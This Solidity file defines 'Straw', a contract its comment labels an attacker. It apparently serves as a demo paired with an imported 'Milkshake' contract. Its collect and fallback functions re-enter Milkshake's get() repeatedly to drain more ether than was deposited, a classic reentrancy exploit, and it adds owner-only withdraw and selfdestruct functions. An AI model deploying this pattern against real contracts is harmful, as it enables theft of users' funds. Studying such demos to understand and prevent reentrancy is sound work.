pragma solidity ^0.5.0;

import "openzeppelin-solidity/contracts/ownership/Ownable.sol";

import "./Milkshake.sol";

/**
 * Attacker smart contract.
 * For any suggestions please contact me at andrei.dimitrief.jianu(at)gmail.com
 */
contract Straw is Ownable
{
    Milkshake private _milkshake;

    uint256 private _amountToTrigger;
    uint256 private _amountToCollect;

    uint256 private _amountCollected;

    constructor (address payable milkshake) 
    public
    {
        _milkshake = Milkshake(milkshake);
    }

    function withdraw(address payable withdrawAddress, uint256 withdrawAmount)
    public
    onlyOwner
    {
        require(address(this).balance > withdrawAmount, "not enough funds");

        withdrawAddress.transfer(withdrawAmount);
    }

    function kill(address payable killAddress) 
    public
    onlyOwner
    {
        selfdestruct(killAddress);
    }

    function collect(uint256 amountToCollect) 
    public 
    payable
    onlyOwner 
    {
        _amountToTrigger = msg.value;
        _amountToCollect = amountToCollect;
        _amountCollected = 0;

        require(_amountToTrigger < _amountToCollect, "need to send less funds than total amount to collect");

        _milkshake.put.value(_amountToTrigger)();
        _milkshake.get();
    }

    function () 
    external
    payable 
    {
        if (address(_milkshake).balance >= msg.value && _amountCollected < _amountToCollect) 
        {
            _amountCollected += msg.value;

            _milkshake.get();
        }
    }
}
